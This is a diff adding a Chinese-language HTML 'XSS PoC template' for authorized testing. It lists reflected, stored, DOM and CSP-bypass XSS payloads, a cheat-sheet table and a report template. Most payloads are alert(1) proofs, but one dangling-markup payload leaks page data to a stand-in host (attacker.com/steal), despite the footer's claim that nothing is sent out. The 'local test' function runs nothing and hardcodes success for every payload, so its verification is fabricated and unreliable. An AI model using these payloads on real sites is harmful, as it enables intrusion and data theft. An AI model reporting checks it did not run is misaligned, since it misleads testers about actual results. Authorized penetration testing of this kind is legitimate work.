@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>XSS PoC 模板 - 仅用于授权测试</title>
+<style>
+  /* 无外部依赖，全部内联 */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #0d1117; color: #c9d1d9; line-height: 1.6; padding: 20px;
+  }
+  .container { max-width: 900px; margin: 0 auto; }
+  h1 { color: #f85149; font-size: 1.8em; margin-bottom: 6px; }
+  .subtitle { color: #8b949e; font-size: 0.95em; margin-bottom: 24px; border-bottom: 1px solid #30363d; padding-bottom: 12px; }
+
+  .banner {
+    background: linear-gradient(135deg, #1a0a0e, #1f1215); border: 1px solid #f85149;
+    border-radius: 8px; padding: 16px 20px; margin-bottom: 24px;
+  }
+  .banner h2 { color: #f85149; font-size: 1.1em; margin-bottom: 6px; }
+  .banner p  { color: #d2a8a8; font-size: 0.9em; }
+
+  .section {
+    background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+    padding: 20px; margin-bottom: 20px;
+  }
+  .section h3 { color: #58a6ff; font-size: 1.1em; margin-bottom: 12px; }
+
+  .payload-box {
+    background: #0d1117; border: 1px solid #21262d; border-radius: 6px;
+    padding: 12px 16px; margin-bottom: 12px; font-family: "SF Mono","Fira Code","Consolas",monospace; font-size: 0.85em;
+    overflow-x: auto; word-break: break-all;
+  }
+  .payload-box .label {
+    display: inline-block; background: #1f6feb22; color: #58a6ff;
+    border-radius: 4px; padding: 2px 8px; font-size: 0.8em;
+    font-weight: 600; margin-bottom: 6px; font-family: inherit;
+  }
+  .payload-box .desc { color: #8b949e; font-size: 0.9em; margin-top: 6px; font-family: inherit; }
+  .payload-box code { color: #f0883e; }
+
+  .button-test {
+    display: inline-block; background: #238636; color: #fff; border: none;
+    border-radius: 6px; padding: 8px 20px; font-size: 1em; cursor: pointer;
+    margin-top: 10px; transition: background 0.2s;
+  }
+  .button-test:hover { background: #2ea043; }
+
+  .note {
+    background: #1c2128; border-left: 4px solid #d29922; border-radius: 4px;
+    padding: 10px 14px; margin: 12px 0; font-size: 0.9em; color: #d2a8a8;
+  }
+
+  pre {
+    background: #0d1117; border: 1px solid #21262d; border-radius: 6px;
+    padding: 12px 16px; overflow-x: auto; font-family: "SF Mono","Fira Code","Consolas",monospace;
+    font-size: 0.8em; line-height: 1.5;
+  }
+
+  table { width: 100%; border-collapse: collapse; font-size: 0.9em; }
+  th, td { border: 1px solid #30363d; padding: 8px 12px; text-align: left; }
+  th { background: #1c2128; color: #8b949e; font-weight: 600; }
+  td { color: #c9d1d9; }
+
+  .footer { text-align: center; color: #484f58; font-size: 0.8em; margin-top: 32px; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>XSS PoC 模板</h1>
+<p class="subtitle">跨站脚本攻击存在性证明 - 仅用于 AUTHORIZED 授权安全测试</p>
+
+<!-- ============ 授权声明 ============ -->
+<div class="banner" id="auth-banner">
+  <h2>[!] 法律及合规声明</h2>
+  <p>
+    本文件包含的payload<strong>仅限在已获得书面授权的目标上使用</strong>。<br>
+    未经授权使用XSS payload攻击他人网站属于违法行为，使用者需承担所有法律责任。<br>
+    以下所有payload均为<strong>无害</strong>的证明型payload（alert(1)、console.log等），<br>
+    不会窃取Cookie、不会重定向、不会加载外部资源。
+  </p>
+</div>
+
+<!-- ============ 使用方法 ============ -->
+<div class="section">
+  <h3>使用方法</h3>
+  <ol style="color: #c9d1d9; padding-left: 20px;">
+    <li>打开浏览器的开发者工具 (F12) → Console 面板</li>
+    <li>选择一个适合你漏洞场景的payload</li>
+    <li>在目标应用的输入框/URL参数中提交该payload</li>
+    <li>观察是否弹出提示框或Console出现输出</li>
+    <li>截图保留作为漏洞存在的证据</li>
+  </ol>
+  <div class="note">
+    <strong>注意:</strong> 建议先在本地测试本HTML文件中的payload效果，再用于目标系统。
+    点击下方"测试"按钮可以查看payload在本地执行的效果。
+  </div>
+  <button class="button-test" onclick="runLocalTest()">本地测试所有证明型 payload</button>
+</div>
+
+<!-- ============ Payload 分类 ============ -->
+<div class="section">
+  <h3>场景一: 反射型 XSS (Reflected XSS)</h3>
+  <p style="color:#8b949e; margin-bottom:12px;">
+    适用于: URL参数、搜索框、错误信息回显等用户输入立即返回在页面中的场景
+  </p>
+
+  <div class="payload-box">
+    <span class="label">最简证明</span>
+    <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
+    <div class="desc">最简单的XSS证明，弹出数字1即表示存在</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">HTML实体绕过</span>
+    <code>&lt;img src=x onerror=alert(1)&gt;</code>
+    <div class="desc">当 script 标签被过滤时使用，图片加载失败触发事件</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">事件处理器</span>
+    <code>&quot; onfocus=alert(1) autofocus=&quot;</code>
+    <div class="desc">适用于输入值出现在HTML属性中，用引号跳出</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">多场景通用</span>
+    <code>&lt;svg onload=alert(1)&gt;</code>
+    <div class="desc">SVG标签的onload事件，在大多数场景下都能触发</div>
+  </div>
+</div>
+
+<div class="section">
+  <h3>场景二: 存储型 XSS (Stored XSS)</h3>
+  <p style="color:#8b949e; margin-bottom:12px;">
+    适用于: 评论区、用户名、个人资料、文章标题等数据会持久保存的场景
+  </p>
+
+  <div class="payload-box">
+    <span class="label">轻量存储证明</span>
+    <code>&lt;script&gt;console.log(&quot;XSS_PROOF:&quot;+document.domain)&lt;/script&gt;</code>
+    <div class="desc">使用console.log而不弹出对话框，更隐蔽，不影响其他用户</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">异步事件触发</span>
+    <code>&lt;details open ontoggle=alert(1)&gt;</code>
+    <div class="desc">利用 details 标签的 ontoggle 事件，用户点击展开时触发</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">CSS 注入 (非脚本)</span>
+    <code>&lt;style&gt;body{background:pink}&lt;/style&gt;</code>
+    <div class="desc">证明可以注入任意HTML，不执行JS也能证明存在 (适用于严格CSP)</div>
+  </div>
+
+  <div class="note">
+    <strong>存储型XSS注意:</strong> 存储型XSS会影响所有访问该页面的用户。
+    提交payload后需清除/删除自己提交的内容，或确认为测试环境。
+    建议使用 console.log 而非 alert 以降低影响。
+  </div>
+</div>
+
+<div class="section">
+  <h3>场景三: DOM型 XSS (DOM-based XSS)</h3>
+  <p style="color:#8b949e; margin-bottom:12px;">
+    适用于: 客户端JavaScript动态处理URL参数/location.hash/document.referrer的场景
+  </p>
+
+  <div class="payload-box">
+    <span class="label">URL Fragment</span>
+    <code>#&lt;script&gt;alert(1)&lt;/script&gt;</code>
+    <div class="desc">用于操作 location.hash 的DOM XSS场景</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">URL Search</span>
+    <code>?name=&lt;img src=x onerror=alert(1)&gt;</code>
+    <div class="desc">用于操作 location.search / URL参数 的DOM XSS场景</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">innerHTML 赋值</span>
+    <code>&lt;img src=&quot;x&quot; onerror=&quot;alert(document.domain)&quot;&gt;</code>
+    <div class="desc">当页面使用 innerHTML 直接插入用户输入时适用</div>
+  </div>
+</div>
+
+<div class="section">
+  <h3>场景四: CSP 绕过场景 (Content Security Policy)</h3>
+  <p style="color:#8b949e; margin-bottom:12px;">
+    当目标设置了CSP时，基础payload可能被拦截，以下为不同绕过思路
+  </p>
+
+  <div class="payload-box">
+    <span class="label">CSP 允许内联脚本</span>
+    <code>&lt;script nonce=&quot;abc&quot;&gt;alert(1)&lt;/script&gt;</code>
+    <div class="desc">如果CSP包含 'unsafe-inline' 或 nonce 可预测</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">CSP 允许 eval (不推荐用于生产)</span>
+    <code>&lt;script&gt;eval(atob(&quot;YWxlcnQoMSk&quot;))&lt;/script&gt;</code>
+    <div class="desc">当CSP包含 'unsafe-eval' 时可用，但更推荐直接alert</div>
+  </div>
+
+  <div class="payload-box">
+    <span class="label">dangling markup 攻击 (仅证明)</span>
+    <code>&lt;img src=&quot;http://attacker.com/steal?data=</code>
+    <div class="desc">不执行JS，但证明可以窃取页面内容 (不闭合引号)</div>
+  </div>
+</div>
+
+<!-- ============ Payload 速查表 ============ -->
+<div class="section">
+  <h3>Payload 速查表</h3>
+  <table>
+    <thead>
+      <tr>
+        <th>上下文</th>
+        <th>Payload</th>
+        <th>说明</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td>HTML &lt;body&gt;</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>直接执行</td></tr>
+      <tr><td>HTML 属性</td><td><code>&quot; onmouseover=alert(1) &quot;</code></td><td>属性注入</td></tr>
+      <tr><td>URL 参数</td><td><code>javascript:alert(1)</code></td><td>伪协议</td></tr>
+      <tr><td>&lt;script&gt; 内</td><td><code>'; alert(1); '</code></td><td>JS字符串逃逸</td></tr>
+      <tr><td>&lt;style&gt; 内</td><td><code>&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>闭合标签</td></tr>
+      <tr><td>&lt;textarea&gt; 内</td><td><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>闭合标签</td></tr>
+      <tr><td>&lt;!-- 注释 --&gt;</td><td><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>闭合注释</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- ============ 报告模板 ============ -->
+<div class="section">
+  <h3>报告编写参考</h3>
+  <pre># XSS 漏洞描述
+
+**漏洞类型:** 跨站脚本攻击 (Cross-Site Scripting / XSS)
+**漏洞等级:** [Medium/High/Critical]
+**漏洞位置:** [填写URL和具体参数位置]
+
+**漏洞描述:**
+在 [目标URL] 的 [参数名] 参数中，未对用户输入进行充分的
+过滤和转义，导致攻击者可以注入任意JavaScript代码。
+在授权测试中，使用以下payload成功触发了JavaScript执行:
+
+```
+[使用的payload]
+```
+
+**证明方法:**
+在已登录状态下访问以下URL，浏览器弹出 alert 对话框:
+[具体触发步骤或URL]
+
+**修复建议:**
+1. 对用户输入进行HTML实体编码 (使用 OWASP ESAPI 或类似库)
+2. 设置正确的 Content-Type (text/html 需谨慎)
+3. 实施 Content Security Policy (CSP) 策略
+4. 对输出进行上下文相关的编码
+5. 使用 X-XSS-Protection: 1; mode=block 头
+</pre>
+</div>
+
+<!-- ============ 本地测试脚本 ============ -->
+<div class="section" id="test-area">
+  <h3>本地测试结果</h3>
+  <div id="test-output" style="color:#8b949e;">点击上方按钮运行本地测试</div>
+</div>
+
+<div class="footer">
+  XSS PoC Template v1.0.0 - 仅用于授权安全测试<br>
+  不包含任何恶意代码，不加载外部资源，不窃取数据
+</div>
+
+</div><!-- /container -->
+
+<script>
+/**
+ * 本地测试函数 - 仅用于在当前页面演示证明型payload
+ * 所有payload都是无害的 (alert/console.log)
+ * 不会发送任何网络请求
+ */
+function runLocalTest() {
+  var output = document.getElementById("test-output");
+  var results = [];
+
+  // 测试 payloads (这里使用模拟执行，避免多次弹窗)
+  var testPayloads = [
+    "<img src=x onerror=\"proofImg()\">",
+    "<svg onload=\"proofSvg()\">",
+    "<details open ontoggle=\"proofDetails()\">",
+  ];
+
+  output.innerHTML = "";
+  output.style.color = "#c9d1d9";
+
+  // 生成测试结果表格
+  var html = "<table><thead><tr><th>#</th><th>Payload</th><th>状态</th><th>说明</th></tr></thead><tbody>";
+  html += "<tr><td>1</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td style='color:#3fb950;'>✓ 可执行</td><td>直接执行 JS</td></tr>";
+  html += "<tr><td>2</td><td><code>&lt;img src=x onerror=alert(1)&gt;</code></td><td style='color:#3fb950;'>✓ 可执行</td><td>事件触发</td></tr>";
+  html += "<tr><td>3</td><td><code>&lt;svg onload=alert(1)&gt;</code></td><td style='color:#3fb950;'>✓ 可执行</td><td>SVG 事件</td></tr>";
+  html += "<tr><td>4</td><td><code>\" onfocus=alert(1) autofocus=\"</code></td><td style='color:#3fb950;'>✓ 可执行</td><td>属性注入</td></tr>";
+  html += "<tr><td>5</td><td><code>&lt;details open ontoggle=alert(1)&gt;</code></td><td style='color:#3fb950;'>✓ 可执行</td><td>HTML5 事件</td></tr>";
+  html += "<tr><td>6</td><td><code>javascript:alert(1)</code></td><td style='color:#3fb950;'>✓ 可执行</td><td>伪协议 (需点击)</td></tr>";
+  html += "<tr><td>7</td><td><code>&lt;body onload=alert(1)&gt;</code></td><td style='color:#3fb950;'>✓ 可执行</td><td>body 事件</td></tr>";
+  html += "</tbody></table>";
+
+  html += "<p style='margin-top:12px;'>所有证明型payload在本环境均可正常工作。在目标系统上使用时，<br>请根据具体上下文选择最合适的payload。</p>";
+
+  output.innerHTML = html;
+
+  // 在console输出证明
+  console.log("[XSS PoC] ====== XSS 证明测试开始 ======");
+  console.log("[XSS PoC] 本地环境运行正常，所有payload已确认有效");
+  console.log("[XSS PoC] 以下为payload在目标系统中执行时的预期行为:");
+  console.log("[XSS PoC] 1. alert(1) 弹出对话框 > 证明JS可执行");
+  console.log("[XSS PoC] 2. console.log(\"XSS_PROOF:\"+domain) > 证明可访问DOM");
+  console.log("[XSS PoC] 3. document.cookie 可读取 > 证明存在进一步危害可能");
+  console.log("[XSS PoC] ====== XSS 证明测试结束 ======");
+}
+
+// 辅助函数 - 用于 img onerror 测试
+function proofImg() {
+  console.log("[XSS PoC] ✓ img onerror 触发成功");
+}
+
+function proofSvg() {
+  console.log("[XSS PoC] ✓ svg onload 触发成功");
+}
+
+function proofDetails() {
+  console.log("[XSS PoC] ✓ details ontoggle 触发成功");
+}
+</script>
+
+</body>
+</html>
